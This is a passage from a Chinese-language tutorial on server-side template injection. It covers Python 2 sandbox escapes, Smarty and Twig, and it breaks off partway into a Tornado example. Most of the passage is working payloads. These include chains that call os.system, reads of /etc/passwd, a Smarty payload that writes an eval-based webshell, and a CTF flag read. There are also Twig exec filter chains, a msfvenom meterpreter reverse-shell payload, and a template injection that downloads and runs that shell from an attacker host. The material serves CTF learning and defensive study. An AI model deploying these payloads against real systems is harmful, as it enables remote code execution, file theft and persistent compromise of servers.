&quot;&quot;.__class__.__bases__[0].__subclasses__()[103].__init__.__globals__[&#x27;__builtins__&#x27;][&#x27;eval&#x27;](&#x27;__import__(&quot;os&quot;).system(&quot;whoami&quot;)&#x27;)misaki\\user\n5.2 python2\npython2.7的模块(252)\nbsddbcompilerctypescurses......webbrowser.pywhichdb.pywsgiref.egg-infoxdrlib.pyxmllib.pyxmlrpclib.pyzipfile.py\n同样利用原代码进行筛选\n----------1-----------(40, &#x27;file&#x27;)----------2-----------(59, &lt;class &#x27;warnings.WarningMessage&#x27;&gt;, &#x27;linecache&#x27;, [&#x27;os&#x27;, &#x27;sys&#x27;, &#x27;__builtins__&#x27;])(59, &lt;class &#x27;warnings.WarningMessage&#x27;&gt;, &#x27;__builtins__&#x27;, None)(59, &lt;class &#x27;warnings.WarningMessage&#x27;&gt;, &#x27;sys&#x27;, None)(59, &lt;class &#x27;warnings.WarningMessage&#x27;&gt;, &#x27;types&#x27;, [&#x27;__builtins__&#x27;])(60, &lt;class &#x27;warnings.catch_warnings&#x27;&gt;, &#x27;linecache&#x27;, [&#x27;os&#x27;, &#x27;sys&#x27;, &#x27;__builtins__&#x27;])(60, &lt;class &#x27;warnings.catch_warnings&#x27;&gt;, &#x27;__builtins__&#x27;, None)(60, &lt;class &#x27;warnings.catch_warnings&#x27;&gt;, &#x27;sys&#x27;, None)(60, &lt;class &#x27;warnings.catch_warnings&#x27;&gt;, &#x27;types&#x27;, [&#x27;__builtins__&#x27;])(61, &lt;class &#x27;_weakrefset._IterationGuard&#x27;&gt;, &#x27;__builtins__&#x27;, None)(62, &lt;class &#x27;_weakrefset.WeakSet&#x27;&gt;, &#x27;__builtins__&#x27;, None)(72, &lt;class &#x27;site._Printer&#x27;&gt;, &#x27;__builtins__&#x27;, None)(72, &lt;class &#x27;site._Printer&#x27;&gt;, &#x27;traceback&#x27;, [&#x27;sys&#x27;, &#x27;__builtins__&#x27;])(72, &lt;class &#x27;site._Printer&#x27;&gt;, &#x27;os&#x27;, [&#x27;sys&#x27;, &#x27;__builtins__&#x27;, &#x27;open&#x27;])(72, &lt;class &#x27;site._Printer&#x27;&gt;, &#x27;sys&#x27;, None)(77, &lt;class &#x27;site.Quitter&#x27;&gt;, &#x27;__builtins__&#x27;, None)(77, &lt;class &#x27;site.Quitter&#x27;&gt;, &#x27;traceback&#x27;, [&#x27;sys&#x27;, &#x27;__builtins__&#x27;])(77, &lt;class &#x27;site.Quitter&#x27;&gt;, &#x27;os&#x27;, [&#x27;sys&#x27;, &#x27;__builtins__&#x27;, &#x27;open&#x27;])(77, &lt;class &#x27;site.Quitter&#x27;&gt;, &#x27;sys&#x27;, None)(78, &lt;class &#x27;codecs.IncrementalEncoder&#x27;&gt;, &#x27;__builtins__&#x27;, None)(78, &lt;class &#x27;codecs.IncrementalEncoder&#x27;&gt;, &#x27;sys&#x27;, None)(78, &lt;class &#x27;codecs.IncrementalEncoder&#x27;&gt;, &#x27;open&#x27;, None)(79, &lt;class &#x27;codecs.IncrementalDecoder&#x27;&gt;, &#x27;__builtins__&#x27;, None)(79, &lt;class &#x27;codecs.IncrementalDecoder&#x27;&gt;, &#x27;sys&#x27;, None)(79, &lt;class &#x27;codecs.IncrementalDecoder&#x27;&gt;, &#x27;open&#x27;, None)----------3-----------(59, 13, &lt;class &#x27;warnings.WarningMessage&#x27;&gt;, &#x27;__import__&#x27;)(59, 13, &lt;class &#x27;warnings.WarningMessage&#x27;&gt;, &#x27;file&#x27;)(59, 13, &lt;class &#x27;warnings.WarningMessage&#x27;&gt;, &#x27;compile&#x27;)(59, 13, &lt;class &#x27;warnings.WarningMessage&#x27;&gt;, &#x27;eval&#x27;)(59, 13, &lt;class &#x27;warnings.WarningMessage&#x27;&gt;, &#x27;open&#x27;)(59, 13, &lt;class &#x27;warnings.WarningMessage&#x27;&gt;, &#x27;execfile&#x27;)(60, 13, &lt;class &#x27;warnings.catch_warnings&#x27;&gt;, &#x27;__import__&#x27;)(60, 13, &lt;class &#x27;warnings.catch_warnings&#x27;&gt;, &#x27;file&#x27;)(60, 13, &lt;class &#x27;warnings.catch_warnings&#x27;&gt;, &#x27;compile&#x27;)(60, 13, &lt;class &#x27;warnings.catch_warnings&#x27;&gt;, &#x27;eval&#x27;)(60, 13, &lt;class &#x27;warnings.catch_warnings&#x27;&gt;, &#x27;open&#x27;)(60, 13, &lt;class &#x27;warnings.catch_warnings&#x27;&gt;, &#x27;execfile&#x27;)(61, 1, &lt;class &#x27;_weakrefset._IterationGuard&#x27;&gt;, &#x27;__import__&#x27;)(61, 1, &lt;class &#x27;_weakrefset._IterationGuard&#x27;&gt;, &#x27;file&#x27;)(61, 1, &lt;class &#x27;_weakrefset._IterationGuard&#x27;&gt;, &#x27;compile&#x27;)(61, 1, &lt;class &#x27;_weakrefset._IterationGuard&#x27;&gt;, &#x27;eval&#x27;)(61, 1, &lt;class &#x27;_weakrefset._IterationGuard&#x27;&gt;, &#x27;open&#x27;)(61, 1, &lt;class &#x27;_weakrefset._IterationGuard&#x27;&gt;, &#x27;execfile&#x27;)(62, 1, &lt;class &#x27;_weakrefset.WeakSet&#x27;&gt;, &#x27;__import__&#x27;)(62, 1, &lt;class &#x27;_weakrefset.WeakSet&#x27;&gt;, &#x27;file&#x27;)(62, 1, &lt;class &#x27;_weakrefset.WeakSet&#x27;&gt;, &#x27;compile&#x27;)(62, 1, &lt;class &#x27;_weakrefset.WeakSet&#x27;&gt;, &#x27;eval&#x27;)(62, 1, &lt;class &#x27;_weakrefset.WeakSet&#x27;&gt;, &#x27;open&#x27;)(62, 1, &lt;class &#x27;_weakrefset.WeakSet&#x27;&gt;, &#x27;execfile&#x27;)(72, 20, &lt;class &#x27;site._Printer&#x27;&gt;, &#x27;file&#x27;)(72, 20, &lt;class &#x27;site._Printer&#x27;&gt;, &#x27;exec&#x27;)(72, 23, &lt;class &#x27;site._Printer&#x27;&gt;, &#x27;__import__&#x27;)(72, 23, &lt;class &#x27;site._Printer&#x27;&gt;, &#x27;file&#x27;)(72, 23, &lt;class &#x27;site._Printer&#x27;&gt;, &#x27;compile&#x27;)(72, 23, &lt;class &#x27;site._Printer&#x27;&gt;, &#x27;eval&#x27;)(72, 23, &lt;class &#x27;site._Printer&#x27;&gt;, &#x27;open&#x27;)(72, 23, &lt;class &#x27;site._Printer&#x27;&gt;, &#x27;execfile&#x27;)(77, 20, &lt;class &#x27;site.Quitter&#x27;&gt;, &#x27;file&#x27;)(77, 20, &lt;class &#x27;site.Quitter&#x27;&gt;, &#x27;exec&#x27;)(77, 23, &lt;class &#x27;site.Quitter&#x27;&gt;, &#x27;__import__&#x27;)(77, 23, &lt;class &#x27;site.Quitter&#x27;&gt;, &#x27;file&#x27;)(77, 23, &lt;class &#x27;site.Quitter&#x27;&gt;, &#x27;compile&#x27;)(77, 23, &lt;class &#x27;site.Quitter&#x27;&gt;, &#x27;eval&#x27;)(77, 23, &lt;class &#x27;site.Quitter&#x27;&gt;, &#x27;open&#x27;)(77, 23, &lt;class &#x27;site.Quitter&#x27;&gt;, &#x27;execfile&#x27;)(78, 21, &lt;class &#x27;codecs.IncrementalEncoder&#x27;&gt;, &#x27;open&#x27;)(78, 23, &lt;class &#x27;codecs.IncrementalEncoder&#x27;&gt;, &#x27;__import__&#x27;)(78, 23, &lt;class &#x27;codecs.IncrementalEncoder&#x27;&gt;, &#x27;file&#x27;)(78, 23, &lt;class &#x27;codecs.IncrementalEncoder&#x27;&gt;, &#x27;compile&#x27;)(78, 23, &lt;class &#x27;codecs.IncrementalEncoder&#x27;&gt;, &#x27;eval&#x27;)(78, 23, &lt;class &#x27;codecs.IncrementalEncoder&#x27;&gt;, &#x27;open&#x27;)(78, 23, &lt;class &#x27;codecs.IncrementalEncoder&#x27;&gt;, &#x27;execfile&#x27;)(79, 21, &lt;class &#x27;codecs.IncrementalDecoder&#x27;&gt;, &#x27;open&#x27;)(79, 23, &lt;class &#x27;codecs.IncrementalDecoder&#x27;&gt;, &#x27;__import__&#x27;)(79, 23, &lt;class &#x27;codecs.IncrementalDecoder&#x27;&gt;, &#x27;file&#x27;)(79, 23, &lt;class &#x27;codecs.IncrementalDecoder&#x27;&gt;, &#x27;compile&#x27;)(79, 23, &lt;class &#x27;codecs.IncrementalDecoder&#x27;&gt;, &#x27;eval&#x27;)(79, 23, &lt;class &#x27;codecs.IncrementalDecoder&#x27;&gt;, &#x27;open&#x27;)(79, 23, &lt;class &#x27;codecs.IncrementalDecoder&#x27;&gt;, &#x27;execfile&#x27;)----------4-----------(60, &#x27;__import__&#x27;)(60, &#x27;file&#x27;)(60, &#x27;repr&#x27;)(60, &#x27;compile&#x27;)(60, &#x27;eval&#x27;)(60, &#x27;open&#x27;)(60, &#x27;execfile&#x27;)\n进一步获取可以直接执行命令或者读取文件的类\n----------1-----------                                                                (40, &#x27;file&#x27;)                                                                          ----------2-----------                                                                (59, &lt;class &#x27;warnings.WarningMessage&#x27;&gt;, &#x27;linecache&#x27;, [&#x27;os&#x27;, &#x27;sys&#x27;, &#x27;__builtins__&#x27;])   (59, &lt;class &#x27;warnings.WarningMessage&#x27;&gt;, &#x27;types&#x27;, [&#x27;__builtins__&#x27;])                    (60, &lt;class &#x27;warnings.catch_warnings&#x27;&gt;, &#x27;linecache&#x27;, [&#x27;os&#x27;, &#x27;sys&#x27;, &#x27;__builtins__&#x27;])   (60, &lt;class &#x27;warnings.catch_warnings&#x27;&gt;, &#x27;types&#x27;, [&#x27;__builtins__&#x27;])                    (72, &lt;class &#x27;site._Printer&#x27;&gt;, &#x27;traceback&#x27;, [&#x27;sys&#x27;, &#x27;__builtins__&#x27;])                   (72, &lt;class &#x27;site._Printer&#x27;&gt;, &#x27;os&#x27;, [&#x27;sys&#x27;, &#x27;__builtins__&#x27;, &#x27;open&#x27;])                  (77, &lt;class &#x27;site.Quitter&#x27;&gt;, &#x27;traceback&#x27;, [&#x27;sys&#x27;, &#x27;__builtins__&#x27;])                    (77, &lt;class &#x27;site.Quitter&#x27;&gt;, &#x27;os&#x27;, [&#x27;sys&#x27;, &#x27;__builtins__&#x27;, &#x27;open&#x27;])                   (78, &lt;class &#x27;codecs.IncrementalEncoder&#x27;&gt;, &#x27;open&#x27;, None)                               (79, &lt;class &#x27;codecs.IncrementalDecoder&#x27;&gt;, &#x27;open&#x27;, None)                               ----------3-----------                                                                (59, 13, &lt;class &#x27;warnings.WarningMessage&#x27;&gt;, &#x27;file&#x27;)                                   (59, 13, &lt;class &#x27;warnings.WarningMessage&#x27;&gt;, &#x27;eval&#x27;)                                   (59, 13, &lt;class &#x27;warnings.WarningMessage&#x27;&gt;, &#x27;open&#x27;)                                   (59, 13, &lt;class &#x27;warnings.WarningMessage&#x27;&gt;, &#x27;execfile&#x27;)                               (60, 13, &lt;class &#x27;warnings.catch_warnings&#x27;&gt;, &#x27;file&#x27;)                                   (60, 13, &lt;class &#x27;warnings.catch_warnings&#x27;&gt;, &#x27;eval&#x27;)                                   (60, 13, &lt;class &#x27;warnings.catch_warnings&#x27;&gt;, &#x27;open&#x27;)                                   (60, 13, &lt;class &#x27;warnings.catch_warnings&#x27;&gt;, &#x27;execfile&#x27;)                               (61, 1, &lt;class &#x27;_weakrefset._IterationGuard&#x27;&gt;, &#x27;file&#x27;)                                (61, 1, &lt;class &#x27;_weakrefset._IterationGuard&#x27;&gt;, &#x27;eval&#x27;)                                (61, 1, &lt;class &#x27;_weakrefset._IterationGuard&#x27;&gt;, &#x27;open&#x27;)                                (61, 1, &lt;class &#x27;_weakrefset._IterationGuard&#x27;&gt;, &#x27;execfile&#x27;)                            (62, 1, &lt;class &#x27;_weakrefset.WeakSet&#x27;&gt;, &#x27;file&#x27;)                                        (62, 1, &lt;class &#x27;_weakrefset.WeakSet&#x27;&gt;, &#x27;eval&#x27;)                                        (62, 1, &lt;class &#x27;_weakrefset.WeakSet&#x27;&gt;, &#x27;open&#x27;)                                        (62, 1, &lt;class &#x27;_weakrefset.WeakSet&#x27;&gt;, &#x27;execfile&#x27;)                                    (72, 20, &lt;class &#x27;site._Printer&#x27;&gt;, &#x27;file&#x27;)                                             (72, 20, &lt;class &#x27;site._Printer&#x27;&gt;, &#x27;exec&#x27;)                                             (72, 23, &lt;class &#x27;site._Printer&#x27;&gt;, &#x27;file&#x27;)                                             (72, 23, &lt;class &#x27;site._Printer&#x27;&gt;, &#x27;eval&#x27;)                                             (72, 23, &lt;class &#x27;site._Printer&#x27;&gt;, &#x27;open&#x27;)                                             (72, 23, &lt;class &#x27;site._Printer&#x27;&gt;, &#x27;execfile&#x27;)                                         (77, 20, &lt;class &#x27;site.Quitter&#x27;&gt;, &#x27;file&#x27;)                                              (77, 20, &lt;class &#x27;site.Quitter&#x27;&gt;, &#x27;exec&#x27;)                                              (77, 23, &lt;class &#x27;site.Quitter&#x27;&gt;, &#x27;file&#x27;)                                              (77, 23, &lt;class &#x27;site.Quitter&#x27;&gt;, &#x27;eval&#x27;)                                              (77, 23, &lt;class &#x27;site.Quitter&#x27;&gt;, &#x27;open&#x27;)                                              (77, 23, &lt;class &#x27;site.Quitter&#x27;&gt;, &#x27;execfile&#x27;)                                          (78, 21, &lt;class &#x27;codecs.IncrementalEncoder&#x27;&gt;, &#x27;open&#x27;)                                 (78, 23, &lt;class &#x27;codecs.IncrementalEncoder&#x27;&gt;, &#x27;file&#x27;)                                 (78, 23, &lt;class &#x27;codecs.IncrementalEncoder&#x27;&gt;, &#x27;eval&#x27;)                                 (78, 23, &lt;class &#x27;codecs.IncrementalEncoder&#x27;&gt;, &#x27;open&#x27;)                                 (78, 23, &lt;class &#x27;codecs.IncrementalEncoder&#x27;&gt;, &#x27;execfile&#x27;)                             (79, 21, &lt;class &#x27;codecs.IncrementalDecoder&#x27;&gt;, &#x27;open&#x27;)                                 (79, 23, &lt;class &#x27;codecs.IncrementalDecoder&#x27;&gt;, &#x27;file&#x27;)                                 (79, 23, &lt;class &#x27;codecs.IncrementalDecoder&#x27;&gt;, &#x27;eval&#x27;)                                 (79, 23, &lt;class &#x27;codecs.IncrementalDecoder&#x27;&gt;, &#x27;open&#x27;)                                 (79, 23, &lt;class &#x27;codecs.IncrementalDecoder&#x27;&gt;, &#x27;execfile&#x27;)                             ----------4-----------                                                                (60, &#x27;file&#x27;)                                                                          (60, &#x27;repr&#x27;)                                                                          (60, &#x27;eval&#x27;)                                                                          (60, &#x27;open&#x27;)                                                                          (60, &#x27;execfile&#x27;)                         \n选取其中一个执行命令，__mro__输出父类，最后一个父类为object\n&gt;&gt;&gt; ().__class__.__mro__[-1].__subclasses__()[72]&lt;class &#x27;site._Printer&#x27;&gt;&gt;&gt;&gt; ().__class__.__mro__[-1].__subclasses__()[72].__init__.__globals__[&#x27;os&#x27;].system(&#x27;whoami&#x27;)misaki\\user\n读取文件\n&gt;&gt;&gt; ().__class__.__mro__[-1].__subclasses__()[72].__init__.__globals__[&#x27;__builtins__&#x27;][&#x27;file&#x27;](&quot;C:\\\\windows\\\\win.ini&quot;).read()&#x27;; for 16-bit app support\\n[fonts]\\n[extensions]\\n[mciextensions]\\n[files]\\n[Mail]\\nMAPI=1\\nCMCDLLNAME32=mapi32.dll\\nCMC=1\\nMAPIX=1\\nMAPIXVER=1.0.0.1\\nOLEMessagin\n其中还可以执行的模块还有很多，比如使用含有__builtins__的其他模块，来调用加载的os等。\n筛选代码来源：Python沙箱逃逸总结\n参考：https://misakikata.github.io/2020/04/python-沙箱逃逸与SSTI/#python2\n五、PHP-smarty模板\nSmarty是最流行的PHP模板语言之一，为不受信任的模板执行提供了安全模式。这会强制执行在 php 安全函数白名单中的函数，因此我们在模板中无法直接调用 php 中直接执行命令的函数(相当于存在了一个disable_function)\n但是，实际上对语言的限制并不能影响我们执行命令，因为我们首先考虑的应该是模板本身，恰好 Smarty 很照顾我们，在阅读模板的文档以后我们发现：$smarty内置变量可用于访问各种环境变量，比如我们使用 self 得到 smarty 这个类以后我们就去找 smarty 给我们的的方法\nsmarty/libs/sysplugins/smarty_internal_data.php　　——&gt;　　getStreamVariable() 这个方法可以获取传入变量的流\n\n这个函数流程大致为：打开你输入的文件$variable，判断文件名是否存在，存在的话在循环中读取到文件全部内容，赋值给变量result，如果不存在则看变量smarty，抛出不同问题，分别为，文件不存在或者文件内容为空\n因此我们可以用这个方法读文件，payload:\n&#123;self::getStreamVariable(&quot;file:///etc/passwd&quot;)&#125;\n同样\nsmarty/libs/sysplugins/smarty_internal_write_file.php　　——&gt;　　Smarty_Internal_Write_File 这个类中有一个writeFile方法\nclass Smarty_Internal_Write_File&#123;    /**     * Writes file in a safe way to disk     *     * @param  string $_filepath complete filepath     * @param  string $_contents file content     * @param  Smarty $smarty    smarty instance     *     * @throws SmartyException     * @return boolean true     */    public function writeFile($_filepath, $_contents, Smarty $smarty)    &#123;        $_error_reporting = error_reporting();        error_reporting($_error_reporting &amp; ~E_NOTICE &amp; ~E_WARNING);        if ($smarty-&gt;_file_perms !== null) &#123;            $old_umask = umask(0);        &#125;        $_dirpath = dirname($_filepath);        // if subdirs, create dir structure        if ($_dirpath !== &#x27;.&#x27; &amp;&amp; !file_exists($_dirpath)) &#123;            mkdir($_dirpath, $smarty-&gt;_dir_perms === null ? 0777 : $smarty-&gt;_dir_perms, true);        &#125;        // write to tmp file, then move to overt file lock race condition        $_tmp_file = $_dirpath . DS . str_replace(array(&#x27;.&#x27;, &#x27;,&#x27;), &#x27;_&#x27;, uniqid(&#x27;wrt&#x27;, true));        if (!file_put_contents($_tmp_file, $_contents)) &#123;            error_reporting($_error_reporting);            throw new SmartyException(&quot;unable to write file &#123;$_tmp_file&#125;&quot;);       &#125;        /*         * Windows&#x27; rename() fails if the destination exists,         * Linux&#x27; rename() properly handles the overwrite.         * Simply unlink()ing a file might cause other processes         * currently reading that file to fail, but linux&#x27; rename()         * seems to be smart enough to handle that for us.         */        if (Smarty::$_IS_WINDOWS) &#123;            // remove original file            if (is_file($_filepath)) &#123;                @unlink($_filepath);            &#125;            // rename tmp file            $success = @rename($_tmp_file, $_filepath);        &#125; else &#123;            // rename tmp file            $success = @rename($_tmp_file, $_filepath);            if (!$success) &#123;                // remove original file                if (is_file($_filepath)) &#123;                    @unlink($_filepath);                &#125;                // rename tmp file                $success = @rename($_tmp_file, $_filepath);            &#125;        &#125;        if (!$success) &#123;            error_reporting($_error_reporting);            throw new SmartyException(&quot;unable to write file &#123;$_filepath&#125;&quot;);        &#125;        if ($smarty-&gt;_file_perms !== null) &#123;            // set file permissions            chmod($_filepath, $smarty-&gt;_file_perms);            umask($old_umask);        &#125;        error_reporting($_error_reporting);        return true;    &#125;&#125;\n可以看到 writeFile 函数第三个参数一个 Smarty 类型，后来找到了 self::clearConfig()，函数原型：\npublic function clearConfig($varname = null)&#123;    return Smarty_Internal_Extension_Config::clearConfig($this, $varname);&#125;\n因此我们可以构造payload写个webshell:\n&#123;Smarty_Internal_Write_File::writeFile($SCRIPT_NAME,&quot;&lt;?php eval($_GET[&#x27;cmd&#x27;]); ?&gt;&quot;,self::clearConfig())&#125;\nCTF地址：https://buuoj.cn/challenges（CISCN2019华东南赛区Web11）\n题目模拟了一个获取IP的API，并且可以在最下方看到 “Build With Smarty !” 可以确定页面使用的是Smarty模板引擎。\n\n在页面的右上角发现了IP，但是题目中显示的API的URL由于环境的原因无法使用，猜测这个IP受X-Forwarded-For头控制。\n将XFF头改为 {6*7} 会发现该位置的值变为了42，便可以确定这里存在SSTI。\n\n直接构造 {system(‘cat /flag’)} 即可得到flag\n\n1. Smarty-SSTI常规利用方式\n**1. &#123;$smarty.version&#125;**&#123;$smarty.version&#125;  #获取smarty的版本号\n\n2. &#123;php&#125;&#123;/php&#125;&#123;php&#125;phpinfo();&#123;/php&#125;  #执行相应的php代码\nSmarty支持使用 {php}{/php} 标签来执行被包裹其中的php指令，最常规的思路自然是先测试该标签。但就该题目而言，使用{php}{/php}标签会报错：\n\n因为在Smarty3版本中已经废弃{php}标签，强烈建议不要使用。在Smarty 3.1，{php}仅在SmartyBC中可用。\n**3. &#123;literal&#125;**&lt;script language=&quot;php&quot;&gt;phpinfo();&lt;/script&gt;   \n这个地方借助了 {literal} 这个标签，因为 {literal} 可以让一个模板区域的字符原样输出。 这经常用于保护页面上的Javascript或css样式表，避免因为Smarty的定界符而错被解析。但是这种写法只适用于php5环境，这道ctf使用的是php7，所以依然失败\n\n4. getstreamvariable\n&#123;self::getStreamVariable(&quot;file:///etc/passwd&quot;)&#125;\nSmarty类的getStreamVariable方法的代码如下：\npublic function getStreamVariable($variable)&#123;        $_result = &#x27;&#x27;;        $fp = fopen($variable, &#x27;r+&#x27;);        if ($fp) &#123;            while (!feof($fp) &amp;&amp; ($current_line = fgets($fp)) !== false) &#123;                $_result .= $current_line;            &#125;            fclose($fp);            return $_result;        &#125;        $smarty = isset($this-&gt;smarty) ? $this-&gt;smarty : $this;        if ($smarty-&gt;error_unassigned) &#123;            throw new SmartyException(&#x27;Undefined stream variable &quot;&#x27; . $variable . &#x27;&quot;&#x27;);        &#125; else &#123;            return null;        &#125;    &#125;\n可以看到这个方法可以读取一个文件并返回其内容，所以我们可以用self来获取Smarty对象并调用这个方法。然而使用这个payload会触发报错如下：\n\n可见这个旧版本Smarty的SSTI利用方式并不适用于新版本的Smarty。而且在3.1.30的Smarty版本中官方已经把该静态方法删除。 对于那些文章提到的利用 Smarty_Internal_Write_File 类的writeFile方法来写shell也由于同样的原因无法使用。\n**5. &#123;if&#125;&#123;/if&#125;**&#123;if phpinfo()&#125;&#123;/if&#125;Smarty的 &#123;if&#125; 条件判断和PHP的if非常相似，只是增加了一些特性。每个&#123;if&#125;必须有一个配对的&#123;/if&#125;，也可以使用&#123;else&#125; 和 &#123;elseif&#125;，全部的PHP条件表达式和函数都可以在if内使用，如||*，or，&amp;&amp;，and，is_array()等等，如：&#123;if is_array($array)&#125;&#123;/if&#125;*既然这样就将XFF头改为 &#123;if phpinfo()&#125;&#123;/if&#125; ：\n\n同样还能用来执行一些系统命令：\n\n2. CTF漏洞成因\n本题中引发SSTI的代码简化后如下：\n&lt;?php    require_once(&#x27;./smarty/libs/&#x27; . &#x27;Smarty.class.php&#x27;);    $smarty = new Smarty();    $ip = $_SERVER[&#x27;HTTP_X_FORWARDED_FOR&#x27;];    $smarty-&gt;display(&quot;string:&quot;.$ip);     // display函数把标签替换成对象的php变量；显示模板&#125;\n可以看到这里使用字符串代替smarty模板，导致了注入的Smarty标签被直接解析执行，产生了SSTI。\n3. PHP的模板注入\n如果是在cookie处执行，最好抓包打payload，可能有url编码的问题\n六、PHP-Blade模板\nBlade 是 Laravel 提供的一个既简单又强大的模板引擎。\n关于blade模板这里不再多说，请参考《laravel Blade 模板引擎》\n遇到在学吧…\n七、PHP-Twig引擎\nTwig是来自于Symfony的模板引擎，它非常易于安装和使用。它的操作有点像Mustache和liquid。\neg：\n&lt;?php　　require_once dirname(__FILE__).&#x27;\\twig\\lib\\Twig\\Autoloader.php&#x27;;　　Twig_Autoloader::register(true);　　$twig = new Twig_Environment(new Twig_Loader_String());　　$output = $twig-&gt;render(&quot;Hello &#123;&#123;name&#125;&#125;&quot;, array(&quot;name&quot; =&gt; $_GET[&quot;name&quot;]));  // 将用户输入作为模版变量的值　　echo $output;?&gt;\nTwig使用一个加载器 loader(Twig_Loader_Array) 来定位模板，以及一个环境变量 environment(Twig_Environment) 来存储配置信息。其中，render() 方法通过其第一个参数载入模板，并通过第二个参数中的变量来渲染模板。使用 Twig 模版引擎渲染页面，其中模版含有 &#123;&#123;name&#125;&#125; 变量，其模版变量值来自于GET请求参数$_GET[&quot;name&quot;] 。\n显然这段代码并没有什么问题，即使你想通过name参数传递一段JavaScript代码给服务端进行渲染，也许你会认为这里可以进行 XSS，但是由于模版引擎一般都默认对渲染的变量值进行编码和转义，所以并不会造成跨站脚本攻击:\n\n但是,如果渲染的模版内容受到用户的控制,情况就不一样了。修改代码为:\n&lt;?php　　require_once dirname(__FILE__).&#x27;/../lib/Twig/Autoloader.php&#x27;;　　Twig_Autoloader::register(true);　　$twig=newTwig_Environment(newTwig_Loader_String());　　$output=$twig-&gt;render(&quot;Hello &#123;$_GET[&#x27;name&#x27;]&#125;&quot;);// 将用户输入作为模版内容的一部分　　echo $output;?&gt;\n上面这段代码在构建模版时，拼接了用户输入作为模板的内容，现在如果再向服务端直接传递 JavaScript 代码，用户输入会原样输出，测试结果显而易见:\n\n如果服务端将用户的输入作为了模板的一部分，那么在页面渲染时也必定会将用户输入的内容进行模版编译和解析最后输出。在Twig模板引擎里,，&#123;&#123;var&#125;&#125; 除了可以输出传递的变量以外，还能执行一些基本的表达式然后将其结果作为该模板变量的值。例如这里用户输入name=&#123;&#123;2*10&#125;&#125; ，则在服务端拼接的模版内容为:\n\n尝试插入一些正常字符和 Twig 模板引擎默认的注释符，构造 Payload 为:\nbmjoker&#123;# comment #&#125;&#123;&#123;2*8&#125;&#125;OK\n实际服务端要进行编译的模板就被构造为:\nbmjoker&#123;# comment #&#125;&#123;&#123;2*8&#125;&#125;OK\n由于 &#123;# comment #&#125; 作为 Twig 模板引擎的默认注释形式，所以在前端输出的时候并不会显示，而 &#123;&#123;2*8&#125;&#125; 作为模板变量最终会返回16 作为其值进行显示，因此前端最终会返回内容 Hello bmjoker16OK \n\n通过上面两个简单的示例,就能得到 SSTI 扫描检测的大致流程(这里以 Twig 为例):\n\n同常规的 SQL 注入检测，XSS 检测一样，模板注入漏洞的检测也是向传递的参数中承载特定 Payload 并根据返回的内容来进行判断的。\n每一个模板引擎都有着自己的语法，Payload 的构造需要针对各类模板引擎制定其不同的扫描规则，就如同 SQL 注入中有着不同的数据库类型一样。\n简单来说，就是更改请求参数使之承载含有模板引擎语法的 Payload，通过页面渲染返回的内容检测承载的 Payload 是否有得到编译解析，有解析则可以判定含有 Payload 对应模板引擎注入，否则不存在 SSTI。\n凡是使用模板的网站，基本都会存在SSTI，只是能否控制其传参而已。\n接下来借助XVWA的代码来实践演示一下SSTI注入\n如果在web页面的源代码中看到了诸如以下的字符，就可以推断网站使用了某些模板引擎来呈现数据\n&lt;div&gt;&#123;$what&#125;&lt;/div&gt;&lt;p&gt;Welcome, &#123;&#123;username&#125;&#125;&lt;/p&gt;&lt;div&gt;&#123;%$a%&#125;&lt;/div&gt;...\n通过注入了探测字符串 $579，以查看应用程序是否进行了相应的计算：\n\n根据这个响应，我们可以推测这里使用了模板引擎，因为这符合它们对于 &#123;&#123; &#125;&#125; 的处理方式\n在这里提供一个针对twig的攻击载荷：\n&#123;&#123;_self.env.registerUndefinedFilterCallback(&quot;exec&quot;)&#125;&#125;&#123;&#123;_self.env.getFilter(&quot;id&quot;)&#125;&#125;\n\n使用msf生成了一个php meterpreter有效载荷\nmsfvenom -p php/meterpreter/reverse_tcp -f raw LHOST=192.168.127.131 LPORT=4321 &gt; /var/www/html/shell.txt\nmsf进行监听：\n\n模板注入远程下载shell，并重命名运行\n&#123;&#123;_self.env.registerUndefinedFilterCallback(&quot;exec&quot;)&#125;&#125;&#123;&#123;_self.env.getFilter(&quot;wget http://192.168.127.131/shell.txt -O /tmp/shell.php;php -f /tmp/shell.php&quot;)&#125;&#125;\n\n以上就是php twig模板注入，由于以上使用的twig为2.x版本，现在官方已经更新到3.x版本，根据官方文档新增了 filter 和 map 等内容，补充一些新版本的payload：\n&#123;&#123;&#x27;/etc/passwd&#x27;|file_excerpt(1,30)&#125;&#125;&#123;&#123;app.request.files.get(1).__construct(&#x27;/etc/passwd&#x27;,&#x27;&#x27;)&#125;&#125;&#123;&#123;app.request.files.get(1).openFile.fread(99)&#125;&#125;&#123;&#123;_self.env.registerUndefinedFilterCallback(&quot;exec&quot;)&#125;&#125;&#123;&#123;_self.env.getFilter(&quot;whoami&quot;)&#125;&#125;&#123;&#123;_self.env.enableDebug()&#125;&#125;&#123;&#123;_self.env.isDebug()&#125;&#125;&#123;&#123;[&quot;id&quot;]|map(&quot;system&quot;)|join(&quot;,&quot;)&#123;&#123;&#123;&quot;&lt;?php phpinfo();&quot;:&quot;/var/www/html/shell.php&quot;&#125;|map(&quot;file_put_contents&quot;)&#125;&#125;&#123;&#123;[&quot;id&quot;,0]|sort(&quot;system&quot;)|join(&quot;,&quot;)&#125;&#125;&#123;&#123;[&quot;id&quot;]|filter(&quot;system&quot;)|join(&quot;,&quot;)&#125;&#125;&#123;&#123;[0,0]|reduce(&quot;system&quot;,&quot;id&quot;)|join(&quot;,&quot;)&#125;&#125;&#123;&#123;[&#x27;cat /etc/passwd&#x27;]|filter(&#x27;system&#x27;)&#125;&#125;\n具体payload分析详见：《TWIG 全版本通用 SSTI payloads》\n利用payload为： msf反弹shell\n&#123;&#123;_self.env.registerUndefinedFilterCallback(&quot;exec&quot;)&#125;&#125;&#123;&#123;_self.env.getFilter(&quot;id&quot;)&#125;&#125;\t\t\t//id是执行linux命令的地方，这个payload好像只能回显最前面的一个\n补充：TWIG 全版本通用 SSTI payloads\n八、Python-tornado模板\ntornado render是python中的一个渲染函数，也就是一种模板，通过调用的参数不同，生成不同的网页，如果用户对render内容可控，不仅可以注入XSS代码，而且还可以通过&#123;&#123;&#125;&#125;进行传递变量和执行简单的表达式。\n以下代码将定义一个TEMPLATE变量作为一个模板文件，然后使用传入的name替换模板中的&quot;FOO&quot;，在进行加载模板并输出，且未对name值进行安全检查输入情况。\nimport tornado.templateimport tornado.ioloopimport tornado.webTEMPLATE = &#x27;&#x27;&#x27;&lt;html&gt; &lt;head&gt;&lt;title&gt; Hello &#123;&#123; name &#125;&#125; &lt;/title&gt;&lt;/head&gt; &lt;body&gt; Hello max &lt;/body&gt;&lt;/html&gt;&#x27;&#x27;&#x27;class MainHandler(tornado.web.RequestHandler):    def get(self):        name = 